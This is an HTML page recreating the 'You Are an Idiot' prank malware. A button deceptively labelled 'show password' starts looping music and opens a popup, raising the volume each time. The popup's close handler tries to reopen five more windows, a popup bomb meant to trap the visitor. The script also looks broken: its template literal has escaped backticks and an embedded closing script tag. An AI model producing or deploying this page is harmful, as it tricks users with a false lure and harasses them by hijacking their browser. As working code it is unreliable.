<!DOCTYPE html>
<html>
<head>
  <title>you are an idiot</title>
  <style>
    body {
      background-color: white;
      font-family: 'Times New Roman', serif;
    }
    button {
      font-family: 'Times New Roman', serif;
      font-size: 16px;
      border: 1px solid black;
      background-color: black;
      color: white;
      padding: 10px 20px;
      cursor: pointer;
      text-transform: lowercase;
    }
    .corner-msg {
      position: fixed;
      top: 10px;
      right: 10px;
      color: red;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>
  <div class="corner-msg" id="cornerMsg">you are an idiot</div>
  <button onclick="startMadness()">show password</button>

  <audio id="bgMusic" loop>
    <source src="idiot.mp3" type="audio/mpeg">
  </audio>
  <audio id="errorSound">
    <source src="error.mp3" type="audio/mpeg">
  </audio>

  <script>
    let volume = 0.1;

    function startMadness() {
      document.getElementById("cornerMsg").style.display = "block";
      const music = document.getElementById("bgMusic");
      music.volume = volume;
      music.play();
      spawnPopup();
    }

    function spawnPopup() {
      const errorSound = document.getElementById("errorSound");
      errorSound.play();

      const popup = window.open("", "", "width=300,height=200");
      if (popup) {
        popup.document.write(\`
          <html>
            <head>
              <title>you are an idiot</title>
              <style>
                body {
                  background-color: white;
                  margin: 0;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  height: 100vh;
                }
              </style>
            </head>
            <body>
              <img src="https://media1.tenor.com/m/vfcEJwmL0C4AAAAC/you-are-an-idiot-malware.gif" width="100%">
              <script>
                window.onbeforeunload = function() {
                  for (let i = 0; i < 5; i++) {
                    window.open(window.location.href, "_blank", "width=300,height=200");
                  }
                };
              </script>
            </body>
          </html>
        \`);
        popup.document.close();

        volume = Math.min(volume + 0.1, 1);
        document.getElementById("bgMusic").volume = volume;
      }
    }
  </script>
</body>
</html>
